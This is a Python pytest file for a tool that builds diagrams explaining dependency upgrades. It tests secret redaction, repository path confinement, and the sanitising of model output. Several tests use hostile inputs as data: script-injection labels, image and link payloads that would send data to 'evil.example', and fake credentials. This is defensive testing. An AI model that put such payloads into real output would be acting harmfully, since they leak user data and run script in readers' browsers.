import io
import json
import os
import urllib.error

import pytest

from bundles import regression_bundle
from upgradeguard import explain, schemas


class MockProvider:
    """A stand-in for a model service. Nothing here is a real model call."""
    destination = "mock service (model mock-1)"

    def __init__(self, answer=None, error=None):
        self.answer, self.error, self.seen = answer, error, None

    def complete(self, system, user):
        self.seen = (system, user)
        if self.error:
            raise self.error
        return self.answer if isinstance(self.answer, str) else json.dumps(self.answer)


def good_graph(allowed):
    assert "dep:jinja2" in allowed and "finding:test-regression" in allowed
    return {"summary": "jinja2 moved and tests fail.",
            "nodes": [{"id": "a", "label": "jinja2", "kind": "package", "change": "modified", "evidence_ids": ["dep:jinja2"], "inferred": False},
                      {"id": "t", "label": "tests", "kind": "test", "change": "unchanged", "failed": True, "evidence_ids": ["finding:test-regression"], "inferred": False}],
            "edges": [{"source": "t", "target": "a", "relation": "tests", "evidence_ids": ["finding:test-regression"], "inferred": True}],
            "findings": [{"text": "five tests fail", "evidence_ids": ["finding:test-regression"]}], "limitations": []}


@pytest.fixture
def bundle(tmp_path):
    return regression_bundle(tmp_path)


def ids_of(bundle):
    return [item["id"] for item in explain.build_evidence(bundle)]


def test_the_evidence_slice_has_fixed_ids_and_no_code_in_report_only_mode(bundle):
    items = explain.build_evidence(bundle)
    assert {"change:main", "verdict:main", "finding:test-regression", "dep:jinja2"} <= {item["id"] for item in items}
    assert not [item for item in items if item["kind"] == "file"]


def test_without_a_model_the_report_diagram_is_valid_and_cites_only_real_evidence(bundle):
    result = explain.explain(bundle)
    assert result["used_model"] is False
    assert explain.validate_graph(result["graph"], set(ids_of(bundle))) == []
    assert schemas.problems("explanation_graph", result["graph"]) == []
    failed = [node for node in result["graph"]["nodes"] if node.get("failed")]
    assert failed and all(node["kind"] == "test" for node in failed)


def test_a_valid_model_answer_is_used_and_the_prompt_marks_evidence_as_untrusted(bundle):
    provider = MockProvider(good_graph(ids_of(bundle)))
    result = explain.explain(bundle, provider=provider)
    assert result["used_model"] and "mock service" in result["source"]
    assert "untrusted" in provider.seen[0]


def test_a_model_that_invents_evidence_is_rejected_and_the_fallback_is_shown(bundle):
    graph = good_graph(ids_of(bundle))
    graph["nodes"][0]["evidence_ids"] = ["test:never_provided"]
    result = explain.explain(bundle, provider=MockProvider(graph))
    assert result["used_model"] is False
    assert any("never provided" in text for text in result["extra_limitations"])


@pytest.mark.parametrize("answer", ["not json", "[]", "{}", json.dumps({"summary": 1})])
def test_bad_model_output_falls_back(bundle, answer):
    result = explain.explain(bundle, provider=MockProvider(answer))
    assert result["used_model"] is False and result["extra_limitations"]


def test_a_model_outage_leaves_the_report_usable(bundle):
    result = explain.explain(bundle, provider=MockProvider(error=explain.ProviderError("the model service could not be reached")))
    assert result["used_model"] is False and "could not be reached" in result["extra_limitations"][0]
    assert result["graph"]["nodes"]


def test_a_failure_on_a_package_node_is_moved_off_it(bundle):
    graph = good_graph(ids_of(bundle))
    graph["nodes"][0]["failed"] = True
    result = explain.explain(bundle, provider=MockProvider(graph))
    assert result["used_model"] and not result["graph"]["nodes"][0].get("failed")
    assert any("failures belong on test nodes" in text for text in result["extra_limitations"])


def test_a_failure_with_no_test_evidence_is_refused(bundle):
    allowed = ids_of(bundle)
    graph = good_graph(allowed)
    graph["nodes"][1]["evidence_ids"] = ["dep:jinja2"]
    assert any("failure needs" in text for text in explain.validate_graph(graph, set(allowed)))


def test_edges_to_missing_nodes_and_duplicate_ids_are_refused(bundle):
    allowed = ids_of(bundle)
    graph = good_graph(allowed)
    graph["edges"][0]["target"] = "nowhere"
    assert any("does not exist" in text for text in explain.validate_graph(graph, set(allowed)))
    graph = good_graph(allowed)
    graph["nodes"][1]["id"] = "a"
    assert any("not unique" in text for text in explain.validate_graph(graph, set(allowed)))


def test_secrets_inside_identifiers_urls_and_long_literals_are_redacted():
    text = ('db_password = "hunter2"\nSECRET_KEY = \'abc\'\nurl = "https://user:pw9@host/x"\njwt = "eyJhbGciOi.eyJzdWIiOi.SflKxwRJSM"\n'
            'token = "sk-abcdefghijklmnopqrstuv"\nblob = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789=="\nplain = 3')
    cleaned = explain.redact(text)
    for secret in ("hunter2", "abc'", "pw9", "SflKxwRJSM", "abcdefghijklmnopqrstuv", "AbCdEfGh"):
        assert secret not in cleaned
    assert "plain = 3" in cleaned


def test_hyphenated_names_and_values_with_commas_are_redacted():
    cleaned = explain.redact("api-key = abc,def\nPRIVATE-KEY: xyz\nmy-auth-token='a b c'\nplain = 1,2")
    for secret in ("abc", "def", "xyz", "a b c"):
        assert secret not in cleaned
    assert "plain = 1,2" in cleaned


def test_long_names_and_long_values_cannot_slip_past_a_bound():
    name = "a_very_long_identifier_name_that_goes_on_and_on_for_more_than_forty_eight_characters_password"
    cleaned = explain.redact("%s = '%s'\nurl = \"https://user:%s@host/x\"\ntoken = \"%s\"" % (name, "S" * 400, "P" * 400, "T" * 400))
    for leaked in ("S" * 20, "P" * 20, "T" * 20):
        assert leaked not in cleaned


def test_a_huge_line_is_dropped_quickly_and_cannot_slow_the_redactor():
    import time
    started = time.time()
    cleaned = explain.redact("a" * 190_000 + "\nok = 1")
    assert time.time() - started < 2 and "ok = 1" in cleaned and "very long line removed" in cleaned


def test_a_secret_near_the_cut_off_is_redacted_before_the_file_is_trimmed(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "a.py").write_text("x = 1\n" * 1990 + "api_key = 'LEAKME123'\n" + "y = 2\n" * 100)
    text = explain.read_selected_files(str(repo), ["a.py"])[0]["text"]
    assert "LEAKME" not in text


def test_secrets_are_redacted_before_anything_is_shared():
    text = "password = hunter2\nAKIAABCDEFGHIJKLMNOP\n-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\nplain line"
    cleaned = explain.redact(text)
    assert "hunter2" not in cleaned and "AKIA" not in cleaned and "abc" not in cleaned and "plain line" in cleaned


def test_selected_files_are_bounded_filtered_and_confined(tmp_path):
    repo = tmp_path / "repo"
    (repo / "pkg").mkdir(parents=True)
    (repo / "pkg" / "a.py").write_text("import jinja2\n" + "x = 1\n" * 5000)
    (repo / ".env").write_text("SECRET=1")
    (tmp_path / "outside.py").write_text("secret")
    os.symlink(str(tmp_path / "outside.py"), str(repo / "link.py"))
    items = explain.read_selected_files(str(repo), ["pkg/a.py"])
    assert len(items[0]["text"].encode()) <= explain.MAX_FILE_BYTES + 200
    for refused in (".env", "../outside.py", "link.py", "/etc/passwd", "missing.py"):
        with pytest.raises(ValueError):
            explain.read_selected_files(str(repo), [refused])
    assert explain.project_files_importing(str(repo), "jinja2") == [os.path.join("pkg", "a.py")]


def test_the_preview_lists_exactly_what_would_be_sent(bundle):
    items = explain.build_evidence(bundle)
    shown = explain.preview(items, "mock service")
    assert shown["destination"] == "mock service" and shown["total_bytes"] > 0 and shown["files"] == []


def hostile_graph(allowed):
    graph = good_graph(allowed)
    graph["nodes"][0]["label"] = '"]; click a href "x" <script>alert(1)</script> %%{i}%%'
    return graph


def test_the_diagram_text_cannot_carry_directives_html_or_links(bundle):
    result = explain.explain(bundle, provider=MockProvider(hostile_graph(ids_of(bundle))))
    assert result["used_model"]
    graph = result["graph"]
    text = explain.mermaid(graph)
    for forbidden in ("<", ">script", "http://", "%%", "javascript:", '"]'):
        assert forbidden not in text.replace("-->", "").replace("-.->", "").replace("==>", "")
    assert not [line for line in text.splitlines() if line.strip().startswith(("click", "%%", "style", "linkStyle"))]
    assert text.count('"') == 2 * len(graph["nodes"])
    svg = explain.svg(graph)
    assert "<script" not in svg and "<" not in svg.split("</defs>")[1].replace("<path", "").replace("<text", "").replace("</text>", "").replace("<g ", "").replace("</g>", "").replace("<rect", "").replace("</svg>", "")


def test_markdown_export_has_the_diagram_evidence_and_limits(bundle):
    result = explain.explain(bundle)
    text = explain.markdown(result["graph"], result["evidence"], result["source"], result["extra_limitations"])
    assert "```mermaid" in text and "flowchart LR" in text and "## Evidence" in text and "does not change the verdict" in text


def test_provider_sends_the_key_from_the_environment_and_never_echoes_it(monkeypatch):
    monkeypatch.setenv("UPGRADEGUARD_EXPLAIN_KEY", "sk-secret")
    sent = {}

    class Response(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *_):
            return False

    def opener(request, timeout):
        sent["auth"], sent["url"], sent["timeout"] = request.get_header("Authorization"), request.full_url, timeout
        return Response(json.dumps({"choices": [{"message": {"content": "{}"}}]}).encode())

    provider = explain.OpenAICompatible("https://models.example/v1/", "m", opener=opener)
    assert provider.complete("s", "u") == "{}"
    assert sent["auth"] == "Bearer sk-secret" and sent["url"] == "https://models.example/v1/chat/completions" and sent["timeout"] == explain.MODEL_TIMEOUT

    def failing(request, timeout):
        raise urllib.error.HTTPError(request.full_url, 401, "bad key sk-secret", {}, None)

    with pytest.raises(explain.ProviderError) as caught:
        explain.OpenAICompatible("https://models.example/v1", "m", opener=failing).complete("s", "u")
    assert "sk-secret" not in str(caught.value) and "401" in str(caught.value)


def test_an_oversized_model_answer_is_refused():
    class Big(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *_):
            return False

    provider = explain.OpenAICompatible("https://m.example/v1", "m", opener=lambda request, timeout: Big(b"x" * (explain.MAX_RESPONSE_BYTES + 5)))
    with pytest.raises(explain.ProviderError):
        provider.complete("s", "u")


def test_local_ollama_is_the_default_explanation_provider():
    provider = explain.provider_from_environment({})
    assert provider.model == "llama3.2:3b"
    assert provider.base_url == "http://127.0.0.1:11434/v1"


def test_the_endpoint_comes_from_the_operator_and_must_be_https():
    with pytest.raises(ValueError):
        explain.provider_from_environment({"UPGRADEGUARD_EXPLAIN_URL": "http://models.example/v1", "UPGRADEGUARD_EXPLAIN_MODEL": "m"})
    assert explain.provider_from_environment({"UPGRADEGUARD_EXPLAIN_URL": "https://models.example/v1", "UPGRADEGUARD_EXPLAIN_MODEL": "m"}).model == "m"


def test_model_text_cannot_smuggle_links_images_or_html_into_the_markdown(bundle):
    graph = good_graph(ids_of(bundle))
    graph["summary"] = "Done. ![x](https://evil.example/?d=secret) <img src=x onerror=1> [click](javascript:alert(1)) see www.evil.example"
    graph["limitations"] = ["Read http://evil.example/leak now", "[a](b)"]
    graph["findings"][0]["text"] = "![i](https://evil.example/p.png)"
    result = explain.explain(bundle, provider=MockProvider(graph))
    assert result["used_model"]
    text = explain.markdown(result["graph"], result["evidence"], result["source"], result["extra_limitations"])
    for forbidden in ("evil", "![", "](", "<img", "javascript", "www."):
        assert forbidden not in text.lower()
    assert "Done." in text


def test_repository_text_in_the_evidence_lines_is_made_plain_too(bundle):
    bundle["diff"]["tests"]["regressions"][0]["test"] = "tests/test_a.py::test_[x](https://evil.example/leak)"
    result = explain.explain(bundle)
    text = explain.markdown(result["graph"], result["evidence"], result["source"], [])
    assert "://" not in text and "](" not in text and "[x]" not in text


def test_a_reasoning_model_gets_the_reasoning_parameters_and_no_temperature():
    sent = {}

    class Answer(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

    def opener(request, timeout):
        sent["body"] = json.loads(request.data)
        sent["timeout"] = timeout
        return Answer(b'{"choices": [{"message": {"content": "{}"}}]}')

    explain.OpenAICompatible("https://m.example/v1", "m", opener=opener, reasoning_effort="high").complete("s", "u")
    assert sent["body"]["reasoning_effort"] == "high" and sent["body"]["max_completion_tokens"] == explain.REASONING_TOKENS
    assert "temperature" not in sent["body"] and "max_tokens" not in sent["body"] and sent["timeout"] == explain.REASONING_TIMEOUT
    explain.OpenAICompatible("https://m.example/v1", "m", opener=opener).complete("s", "u")
    assert sent["body"]["temperature"] == 0 and sent["body"]["max_tokens"] == 1800 and "reasoning_effort" not in sent["body"]
    explain.OpenAICompatible("https://m.example/v1", "m", opener=opener, reasoning_effort="extreme").complete("s", "u")
    assert "reasoning_effort" not in sent["body"]


def test_the_environment_turns_the_reasoning_option_on():
    provider = explain.provider_from_environment({"UPGRADEGUARD_EXPLAIN_URL": "https://m.example/v1", "UPGRADEGUARD_EXPLAIN_MODEL": "m",
                                                  "UPGRADEGUARD_EXPLAIN_REASONING_EFFORT": "High"})
    assert provider.reasoning_effort == "high"
